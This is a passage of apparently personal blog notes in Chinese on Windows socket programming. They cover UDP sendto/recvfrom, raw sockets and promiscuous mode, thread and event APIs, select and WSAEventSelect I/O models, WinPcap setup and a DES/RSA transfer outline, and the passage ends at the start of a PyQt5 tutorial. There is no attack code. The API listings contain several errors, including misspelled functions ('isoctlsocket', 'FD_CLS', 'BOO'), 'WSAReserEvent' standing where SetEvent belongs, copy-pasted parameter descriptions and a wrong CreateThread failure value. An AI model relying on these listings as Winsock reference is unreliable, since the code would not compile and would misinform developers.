地址结构长度</span></span></span></span><br><span class="line"><span class="params"><span class="function"> )</span></span>;</span><br><span class="line"><span class="comment">// 该函数返回实际发送了的字节总数</span></span><br><span class="line"><span class="comment">// 在数据报套接字中则需要输入地址</span></span><br><span class="line">iResult = <span class="built_in">sendto</span>(ConnectLessSocket,sendbuf,(<span class="type">int</span>)<span class="built_in">strlen</span>(sendbuf),<span class="number">0</span>,result-&gt;ai_addr,(<span class="type">int</span>)result-&gt;ai_addrlen);</span><br><span class="line"><span class="keyword">if</span>(iResult == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sendto failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectLessSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">recvfrom</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in SOCKET s, <span class="comment">// 已连接套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out <span class="type">char</span>* buf, <span class="comment">// 接受缓冲区</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> len, <span class="comment">// 接受缓冲区的字节长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> flags <span class="comment">// 改变套接字调用的默认行为方式。默认为0。MSG_DONTROUTE(不经过本地的路由机制)，MSG_OOB(带外数据)</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out <span class="keyword">struct</span> sockaddr* from, <span class="comment">// 源地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in_outopt_ <span class="type">int</span> *fromlen <span class="comment">// 地址结构长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"><span class="comment">// 该函数返回实际接收了的字节总数</span></span></span><br><span class="line"><span class="function">iResult </span>= <span class="built_in">recvfrom</span>(ConnectLessSocket,recvbuf, recvbuflen,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(iResult &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bytes received: %d\n&quot;</span>, iResult);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(iResult == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;recv failed with error: %d\n&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br></pre></td></tr></table></figure></li><li><p>UDP参数</p><p><code>socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</code></p></li></ul><h3 id="6-原始套接字函数"><a href="#6-原始套接字函数" class="headerlink" title="6 原始套接字函数"></a>6 原始套接字函数</h3><ul><li><p>作用</p><blockquote><p>作用于网络层。</p></blockquote><ol><li>发送和接受ICMP IGMP等包。</li><li>发送和接受内核 不处理其协议字段的IPv4数据包。实现非常规协议OSPF。</li><li>控制IPv4首部，伪造IP地址。</li></ol></li><li><p>常用协议</p></li></ul><div class="table-container"><table><thead><tr><th>协议名</th><th>值</th><th>协议</th></tr></thead><tbody><tr><td>IPPROTO_IP</td><td>0</td><td>IP协议</td></tr><tr><td>IPPROTO_ICMP</td><td>1</td><td>ICMP协议</td></tr><tr><td>IPPROTO_IGMP</td><td>2</td><td>IGMP协议</td></tr><tr><td>IPPROTO_RFCOMM</td><td>3</td><td>PFCOMM协议</td></tr><tr><td>IPPROTO_IPv4</td><td>4</td><td>IPv4协议</td></tr><tr><td>IPPROTO_TCP</td><td>6</td><td>TCP协议</td></tr><tr><td>IPPROTO_UDP</td><td>17</td><td>UDP协议</td></tr><tr><td>IPPROTO_IPv6</td><td>41</td><td>IPv6协议</td></tr><tr><td>IPPROTO_ICMPv6</td><td>58</td><td>ICMPv6协议</td></tr><tr><td>IPPROTO_RAW</td><td>255</td><td>RAW协议</td></tr></tbody></table></div><ul><li><p>准备工作</p><blockquote><p>选项 IP_HDRINCL</p><p>开启可以对IP首部进行控制。<br>关闭则只能对下一协议首部和协议数据控制。</p></blockquote><ul><li>本地地址关联——bind()（不常见）</li><li>远端地址关联——connect()（不常见）</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置网卡混杂模式</span></span><br><span class="line">u_long optival = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">isoctlsocket</span>(s,SIO_RCVALL,&amp;optival);</span><br></pre></td></tr></table></figure></li><li><p>IP参数</p><blockquote><p>端口号填0 ，网络层无端口的概念。</p></blockquote><p><code>socket (AF_INET , SOCK_RAW , IPPROTO_ICMP);</code></p></li></ul><h3 id="7-多线程函数"><a href="#7-多线程函数" class="headerlink" title="7 多线程函数"></a>7 多线程函数</h3><h4 id="7-1-线程函数"><a href="#7-1-线程函数" class="headerlink" title="7.1 线程函数"></a>7.1 线程函数</h4><ul><li><p>线程创建</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 线程函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFunc</span><span class="params">(LPVOID lpvThreadParm)</span></span>;</span><br><span class="line"><span class="comment">// 线程创建</span></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T dwStackSize, <span class="comment">// 0</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress, <span class="comment">// 上面线程名 ThreadFunc</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter, <span class="comment">// 上面线程参数 lpvThreadParm</span></span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags, <span class="comment">// 0</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPDWORD lpThreadId <span class="comment">// 0</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// 线程创建成功，返回线程的句柄，失败，返回值是-1。</span></span><br><span class="line"><span class="comment">// 同样的线程函数只需要初始化一个线程函数名，每次调用返回不同的句柄以此来区分线程。</span></span><br></pre></td></tr></table></figure></li><li><p>线程操作</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1、暂停线程</span></span><br><span class="line"><span class="function">DWORD <span class="title">SuspendThread</span><span class="params">(HANDLE hThread)</span></span>;</span><br><span class="line"><span class="comment">// hThread：要暂停线程的句柄，一般要在线程外执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、恢复线程</span></span><br><span class="line"><span class="function">DWORD <span class="title">ResumeThread</span><span class="params">(HANDLE hThread)</span></span>;</span><br><span class="line"><span class="comment">// hThread：要恢复线程的句柄，一般要在线程外执行（恢复后线程输入的参数会出错）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、使线程睡眠</span></span><br><span class="line"><span class="function">VOID <span class="title">Sleep</span><span class="params">(DWORD dwMilliseconds)</span></span>;</span><br><span class="line"><span class="comment">// dwMilliseconds：线程睡眠的时间，单位是毫秒，要在线程内执行</span></span><br></pre></td></tr></table></figure></li><li><p>终止线程</p><ol><li>线程函数返回（最好）。</li><li>通过调用ExitThread函数，线程将自行撤销。</li><li>同一个进程的另一个线程调用TerminateThread函数。</li><li>包含线程的进程终止。</li></ol><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 线程内退出</span></span><br><span class="line"><span class="function">VOID <span class="title">ExitThread</span><span class="params">(DWORD dwExitCode)</span></span>;</span><br><span class="line"><span class="comment">// dwExitCode：线程退出码，根据需要设置，一般设为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程外终止</span></span><br><span class="line"><span class="function">BOOL <span class="title">TerminateThread</span><span class="params">(HANDLE hThread,DWORD dwExitCode)</span></span>;</span><br><span class="line"><span class="comment">// hThread：要终止的线程句柄</span></span><br><span class="line"><span class="comment">// dwExitCode：线程退出码，根据需要设置</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="7-2-线程通信"><a href="#7-2-线程通信" class="headerlink" title="7.2 线程通信"></a>7.2 线程通信</h4><ul><li><p>临界段</p><ul><li>临界段：以原子方式执行关键代码段。</li><li>关键代码段：是指一小段代码，同一个时刻，只能有一个线程具有访问权。</li><li>多个线程访问同一个临界区的原则<ol><li>一次最多只能一个线程停留在临界区内。</li><li>不能让一个线程无限地停留在临界区内，否则其它线程将不能进入该临界区。</li></ol></li></ul></li><li><p>临界段的使用</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.首先定义一个临界段对象（通常全局变量）</span></span><br><span class="line">CRITICAL_SECTION  cs;</span><br><span class="line"><span class="comment">// 2.在main函数中临界段对象初始化</span></span><br><span class="line"><span class="built_in">InitializeCriticalSection</span>(&amp;cs);</span><br><span class="line"><span class="comment">// 3.在要执行关键代码进入临界段</span></span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;cs);</span><br><span class="line"><span class="comment">// 4.在执行完关键代码离开临界段</span></span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;cs);</span><br><span class="line"><span class="comment">// 5.释放临界段对象</span></span><br><span class="line"><span class="built_in">DeleteCriticalSection</span>(&amp;cs);</span><br></pre></td></tr></table></figure></li><li><p>事件</p><blockquote><p>在Windows环境下，事件被理解为可以通过代码响应或处理的操作。</p><p>事件主要用于标识一个操作是否已经完成。</p><p>有两种不同类型的事件对象，一种是人工重置的事件，另一种是自动重置的事件。当人工重置的事件得到通知时，等待该事件的所有线程均变为可调度线程。当一个自动重置的事件得到通知时，等待该事件的线程中只有一个线程变为可调度线程。</p></blockquote></li><li><p>事件对象属于内核对象，它包含三个主要内容</p><ol><li>一个使用计数。</li><li>一个布尔值，指明该事件是自动复位事件(false)，还是人工复位事件(true)。</li><li>一个布尔值，指明该事件是已通知状态(true)，还是未通知状态(false) 。</li></ol></li><li><p>事件的使用</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.创建事件</span></span><br><span class="line"><span class="function">HANDLE WINAPI <span class="title">CreateEvent</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">BOOL bManualReset,</span></span></span><br><span class="line"><span class="params"><span class="function">BOOL bInitialState,</span></span></span><br><span class="line"><span class="params"><span class="function">LPCTSTR lpName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// lpEventAttributes：NULL</span></span><br><span class="line"><span class="comment">// bManualReset：告诉系统是创建一个人工重置的事件（TRUE）还是创建一个自动重置的事件（FALSE）。常设置TRUE；</span></span><br><span class="line"><span class="comment">// bInitialState：用于指明该事件是要初始化为已通知状态（TRUE）还是未通知状态（FALSE）。常设置为FALSE;</span></span><br><span class="line"><span class="comment">// lpName：事件对象的名字，是一个字符串，名字对大小写敏感。</span></span><br><span class="line"><span class="comment">// 自动重置: SetEvent之后, 事件自动重置为未触发状态。</span></span><br><span class="line"><span class="comment">// 手动重置 : SetEvent之后, 需要调用ResetEvent事件才置为未触发状态。</span></span><br><span class="line"><span class="comment">// 区别 : 当一个手动重置事件被触发的时候, 正在等待该事件的所有线程都变为可调度状态; 当一个自动重置事件被触发的时候, 只有一个正在等待该事件的线程会变为可调度状态.系统并不会保证会调度其中的哪个线程, 剩下的线程将继续等待.这样, 可以在在每个线程函数返回之前调用SetEvent。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.将事件改为已通知状态</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">SetEvent</span><span class="params">(HANDLE hEvent)</span></span>;</span><br><span class="line"><span class="comment">// 3.将该事件改为未通知状态</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ResetEvent</span><span class="params">(HANDLE hEvent)</span></span>;</span><br><span class="line"><span class="comment">// 4.等待单个事件变为通知态</span></span><br><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(HANDLE hObject,DWORD dwMilliseconds)</span></span>;</span><br><span class="line"><span class="comment">// hObject：事件的句柄</span></span><br><span class="line"><span class="comment">// dwMilliseconds：指定要等待的毫秒数。如设为零，表示立即返回。如指定常数INFINITE，则可根据实际情况无限等待下去。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.等待一组事件变为通知态</span></span><br><span class="line"><span class="function">DWORD <span class="title">WaitForMultipleObjects</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD nCount,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">const</span> HANDLE* lpHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">BOO bWaitAll,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dwMilliseconds</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// nCount：监控对象的个数</span></span><br><span class="line"><span class="comment">// lpHandles：一组对象句柄的指针</span></span><br><span class="line"><span class="comment">// bWaitAll：是否等待全部符合条件，如果为TRUE，表示除非事件都变成通知态，否则就一直等待下去；如果FALSE，表示只要有一个事件都变成通知态，就立即返回</span></span><br><span class="line"><span class="comment">// dwMilliseconds：指定要等待的毫秒数。如设为零，表示立即返回。如指定常数INFINITE，则可根据实际情况无限等待下去</span></span><br></pre></td></tr></table></figure></li><li><p><a href="https://blog.csdn.net/qq_31094099/article/details/80307113">事件实例</a></p></li></ul><hr><h2 id="三、拓展处理"><a href="#三、拓展处理" class="headerlink" title="三、拓展处理"></a>三、拓展处理</h2><h3 id="1-TCP"><a href="#1-TCP" class="headerlink" title="1 TCP"></a>1 TCP</h3><ul><li><p>TCP的流传输控制</p></li><li><p>面向连接程序的可靠性保护</p></li></ul><h3 id="2-UDP"><a href="#2-UDP" class="headerlink" title="2 UDP"></a>2 UDP</h3><ul><li><p>可靠性</p></li><li><p>并发性</p></li></ul><hr><h2 id="四、I-O操作"><a href="#四、I-O操作" class="headerlink" title="四、I/O操作"></a>四、I/O操作</h2><h3 id="1-阻塞I-O模型"><a href="#1-阻塞I-O模型" class="headerlink" title="1 阻塞I/O模型"></a>1 阻塞I/O模型</h3><ul><li>通信过程<ol><li>初始化</li><li>recv()</li><li>return<ul><li>0 关闭</li><li>>0 请求—&gt;重复</li><li>&lt;0 处理错误</li></ul></li></ol></li></ul><h3 id="2-非阻塞I-O模型"><a href="#2-非阻塞I-O模型" class="headerlink" title="2 非阻塞I/O模型"></a>2 非阻塞I/O模型</h3><ul><li><p>通信过程</p><ol><li>初始化</li><li>recv()</li><li>return <ul><li>0：关闭</li><li>>0：请求—&gt;重复</li><li>&lt;0：WSAEWOULD重复  |  其他 处理错误</li></ul></li></ol></li><li><p>设置非阻塞</p><blockquote><p>函数在第二章。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置非阻塞</span></span><br><span class="line"><span class="type">int</span> iMode = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> iResult = <span class="built_in">ioctlsocket</span>(s,FIONBIO,(u_long*)&amp;iMode);</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-I-O复用模型"><a href="#3-I-O复用模型" class="headerlink" title="3 I/O复用模型"></a>3 I/O复用模型</h3><ul><li><p>通信过程：等待事件</p></li><li><p>复用函数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 事件结构：数量，套接字（FD_SETSIZE = 64）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">fd_set</span></span><br><span class="line">&#123;</span><br><span class="line">    u_int fd_count;</span><br><span class="line">    SOCKET fd_array[FD_SETSIZE];</span><br><span class="line">&#125;fd_set;</span><br><span class="line"><span class="function">in <span class="title">select</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> nfds,</span></span></span><br><span class="line"><span class="params"><span class="function">    __int_out fd_set* readfds, </span></span></span><br><span class="line"><span class="params"><span class="function">    __int_out fd_set* writefds, </span></span></span><br><span class="line"><span class="params"><span class="function">    __int_out fd_set* execptfds, </span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="keyword">struct</span> timeval* timeout </span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>;</span><br><span class="line"><span class="comment">// nfds：为了与Berkeley套接字兼容保留的，执行时被忽略（填0）。</span></span><br><span class="line"><span class="comment">// readfds：指定一个套接字集合，可读性（连接请求，有数据可读，连接关闭、重置或终止）。</span></span><br><span class="line"><span class="comment">// writefds：指定一个套接字集合，可读性（连接请求，有数据可读，连接关闭、重置或终止）。</span></span><br><span class="line"><span class="comment">// execptfds：指定一个套接字集合，可读性（连接请求，有数据可读，连接关闭、重置或终止）。</span></span><br><span class="line"><span class="comment">// timeout：等待时间，阻塞模式设置NULL表示无限长。</span></span><br><span class="line"><span class="comment">// 函数返回发送网络事件的所有套接字数量综合，超时返回0，错误返回SOCKET_ERROR。</span></span><br><span class="line"><span class="comment">// 填入的套接字集合会只留下发生了网络事件的套接字。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从set中删除s</span></span><br><span class="line"><span class="built_in">FD_CLS</span>(s,*set);</span><br><span class="line"><span class="comment">// s if in set</span></span><br><span class="line"><span class="built_in">FD_ISSET</span>(s,*set);</span><br><span class="line"><span class="comment">// 从set中加入s</span></span><br><span class="line"><span class="built_in">FD_SET</span>(s,*set);</span><br><span class="line"><span class="comment">// 将set置空</span></span><br><span class="line"><span class="built_in">FD_ZERO</span>(*set);</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-基于消息的WSAAsyncSelect模型"><a href="#4-基于消息的WSAAsyncSelect模型" class="headerlink" title="4 基于消息的WSAAsyncSelect模型"></a>4 基于消息的WSAAsyncSelect模型</h3><h3 id="5-基于事件的WSAEventSelect模型"><a href="#5-基于事件的WSAEventSelect模型" class="headerlink" title="5 基于事件的WSAEventSelect模型"></a>5 基于事件的WSAEventSelect模型</h3><ul><li><p>通信过程：等待事件</p></li><li><p>事件函数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建事件对象（事件处于人工重置模式和未授信状态）</span></span><br><span class="line"><span class="function">WSAEVENT <span class="title">WSACreateEvent</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 设为未授信，成功返回TRUE</span></span><br><span class="line"><span class="function">BOOL <span class="title">WSAReserEvent</span><span class="params">(__in WSAEVENT hEvent)</span></span>;</span><br><span class="line"><span class="comment">// 设为已授信，成功返回TRUE</span></span><br><span class="line"><span class="function">BOOL <span class="title">WSAReserEvent</span><span class="params">(__in WSAEVENT hEvent)</span></span>;</span><br><span class="line"><span class="comment">// 关闭事件对象，成功返回TRUE</span></span><br><span class="line"><span class="function">BOOL <span class="title">WSACloseEvent</span><span class="params">( __in WSAEVENT hEvent )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定监视事件到套接字和事件对象中（多个事件用 | 关联）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WSAEventSelect</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__int SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in WSAEVENT hEventObject, <span class="comment">// 与网络事件集合关联的事件对象句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">long</span> lNetworkEvents <span class="comment">// 感兴趣事件集合</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>;</span><br><span class="line"><span class="comment">// 成功返回0，失败返回SOCKET_ERROR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待事件</span></span><br><span class="line"><span class="function">DWORD <span class="title">WSAWaitForMultipleEvents</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in DWORD cEvents, <span class="comment">// 指定参数lphEvents指向的数组中包含的事件对象句柄的数量</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> WSAEVENT* lphEvents, <span class="comment">// 指向事件对象句柄数组的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in BOOL fWaitAll, <span class="comment">// True：lphEvents事件全变为已授信才返回，False：有一个已授信就返回</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in DWORD dwTimeout, <span class="comment">// 超时时间,WSA_INFINITE无限</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in BOOL fAlertable <span class="comment">// 指定当完成例程在系统队列中排队等待执行时函数是否返回，TRUE返回时例程已经被执行，FALSE则说明未被执行。（事件模型中填FALSE）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// 返回值</span></span><br><span class="line"><span class="comment">// WSA_WAIT_TIMEOUT：超时</span></span><br><span class="line"><span class="comment">// WSA_WAIT_FAILED：失败，检查参数</span></span><br><span class="line"><span class="comment">// 返回索引（返回授信事件的索引），该值需要减去</span></span><br><span class="line"><span class="comment">// WSA_WAIT_EVENT_0才是正确索引（一般该宏值为0）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 枚举事件</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WSANETWORKEVENTS</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> lNetworkEvents; <span class="comment">// 已发生的网络事件</span></span><br><span class="line">    <span class="type">int</span> iErrorCode[FD_MAX_EVENTS]; <span class="comment">// 存事件的相关出错码</span></span><br><span class="line">&#125;WSANETWORKEVENTS,*LPWSANETWORKEVENTS;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WSAEnumNetworkEvents</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in WSAEVENT hEventObject, <span class="comment">// 需复位的相应事件对象，指定了本函数会重置这个事件对象的状态</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out LPWSANETWORKEVENTS lpNetworkEvents <span class="comment">// 一个WSANETWORKEVENTS结构的数组，每个元素记录了一个网络事件和相应的出错码</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// 成功返回0，失败返回SOCKET_ERROR</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="6-重叠I-O模型"><a href="#6-重叠I-O模型" class="headerlink" title="6 重叠I/O模型"></a>6 重叠I/O模型</h3><h3 id="7-完成端口模型"><a href="#7-完成端口模型" class="headerlink" title="7 完成端口模型"></a>7 完成端口模型</h3><hr><h2 id="五、WinPcap编程"><a href="#五、WinPcap编程" class="headerlink" title="五、WinPcap编程"></a>五、WinPcap编程</h2><h3 id="1-Winpcap基础"><a href="#1-Winpcap基础" class="headerlink" title="1 Winpcap基础"></a>1 Winpcap基础</h3><h3 id="2-环境配置"><a href="#2-环境配置" class="headerlink" title="2 环境配置"></a>2 环境配置</h3><blockquote><p><a href="https://www.jianshu.com/p/c57d270648b4">无法打开”sys/time.h”</a></p></blockquote><ol><li>C/C++ 常规：附加包含目录 Include</li><li>链接器 常规：附加库目录 Lib [ /64x ]</li><li>连接器 输入：附加依赖项目 Packet.lib;wpcap.lib;ws2_32.lib</li></ol><h3 id="3-wpcap-dll"><a href="#3-wpcap-dll" class="headerlink" title="3 wpcap.dll"></a>3 wpcap.dll</h3><h3 id="4-Packet-dll"><a href="#4-Packet-dll" class="headerlink" title="4 Packet.dll"></a>4 Packet.dll</h3><hr><h2 id="六、端口扫描"><a href="#六、端口扫描" class="headerlink" title="六、端口扫描"></a>六、端口扫描</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1 原理"></a>1 原理</h3><h3 id="2-工具"><a href="#2-工具" class="headerlink" title="2 工具"></a>2 工具</h3><h3 id="3-实现"><a href="#3-实现" class="headerlink" title="3 实现"></a>3 实现</h3><hr><h2 id="七、网络安全传输"><a href="#七、网络安全传输" class="headerlink" title="七、网络安全传输"></a>七、网络安全传输</h2><ul><li><p>流程<img src="/posts/4962e50b/安全编程流程.jpg" alt="img"></p></li><li><p>主要功能</p><blockquote><p>使用DES和RSA混合加密传输网络数据。客户端为数据发送端，服务器端为数据接收端。</p></blockquote></li><li><p>客户端主要步骤</p><ol><li>接收公钥并返回确认。</li><li>生成DES的密钥。</li><li>用户输入发送数据。</li><li>使用DES密钥加密数据。</li><li>使用RSA公钥加密DES密钥。</li><li>将将被加密的密钥和被加密的数据一起发送给服务器。</li></ol></li><li><p>服务器端主要步骤</p><ol><li>生成RSA的公钥私钥对。</li><li>发送公钥给客户端。</li><li>接收被加密的密钥和数据并返回确认。</li><li>使用私钥解密DES密钥。</li><li>使用DES密钥解密数据。</li><li>显示数据。</li></ol></li></ul><hr><h2 id="八、实例"><a href="#八、实例" class="headerlink" title="八、实例"></a>八、实例</h2><ul><li><a href="https://github.com/Magialeaf/Course/tree/main/Network_Programming">my::全部实例</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> C </tag>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PyQt5</title>
      <link href="/posts/9898eb96.html"/>
      <url>/posts/9898eb96.html</url>
      
        <content type="html"><![CDATA[<h1 id="PyQt5"><a href="#PyQt5" class="headerlink" title="PyQt5"></a>PyQt5</h1><blockquote><p><a href=".\a378bd8e">text::Python</a> </p></blockquote><hr><h2 id="一、PyQt5安装"><a href="#一、PyQt5安装" class="headerlink" title="一、PyQt5安装"></a>一、PyQt5安装</h2><blockquote><p><a href="https://riverbankcomputing.com/static/Docs/PyQt5/api/qtcore/qtcore-module.html">PyQt5库</a></p><p><a href="https://doc.qt.io/qt-5/qtwidgets-module.html">C++PyQt5库</a></p></blockquote><ul><li><p>安装</p><p><code>pip install PyQt5 -i https://pypi.douban.com/simple</code></p></li></ul><hr><h2 id="二、QT-designer"><a href="#二、QT-designer" class="headerlink" title="二、QT designer"></a>二、QT designer</h2><ul><li><p>安装</p><blockquote><p><a href="https://blog.csdn.net/weixin_40883833/article/details/126333030">安装</a>    <a href="https://blog.csdn.net/weixin_40883833/article/details/126333046">配置</a>    <a href="https://www.cnblogs.com/-dawn/p/15717899.html">版本问题</a>    <a href="https://www.modb.pro/db/112043">3.9.0a4不行</a></p><p>pip install PyQt5-tools -i <a href="https://pypi.douban.com/simple">https://pypi.douban.com/simple</a></p><p>python版本要在 3.10 以下</p><p>pycharm External Tools页面位置：File &gt; Settings &gt; Tools &gt; External Tools </p></blockquote></li><li><p>配置工具</p><ul><li><p>Name：QtDesigner</p><blockquote><p><code>Program：（Python安装路径）\Lib\site-packages\qt5_applications\Qt\bin\designer.exe</code></p><p><code>Working directory：$ProjectFileDir$</code></p></blockquote></li><li><p>QtDesigner制作UI界面，生成.ui文件，需要通过PyUIC转换成.py文件。</p><blockquote><p><code>Name：PyUIC</code></p><p><code>Program：（Python安装路径）</code></p><p><code>Arguments：-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py</code></p><p><code>Working directory：$FileDir$</code></p></blockquote></li></ul><ul><li><p>PyRcc可以将图片、数据文件资源打包成py文件。    </p><blockquote><p><code>Name：PyRcc</code></p><p><code>Program：（Python安装路径）</code></p><p><code>Arguments：-m PyQt5.pyrcc_main $FileName$ -o $FileNameWithoutExtension$_rc.py</code></p><p><code>Working directory：$FileDir$</code></p></blockquote></li></ul></li><li><p>QT designer使用</p><ul><li><p>加载ui文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> uic</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    ui = uic.loadUi(<span class="string">&quot;./untitled.ui&quot;</span>)</span><br><span class="line">    ui.show()</span><br><span class="line">    app.exec_()</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="三、PyQt5-QtWidgets"><a href="#三、PyQt5-QtWidgets" class="headerlink" title="三、PyQt5.QtWidgets"></a>三、PyQt5.QtWidgets</h2><h3 id="1-窗口"><a href="#1-窗口" class="headerlink" title="1 窗口"></a>1 窗口</h3><h4 id="1-1-简单案例"><a href="#1-1-简单案例" class="headerlink" title="1.1 简单案例"></a>1.1 简单案例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 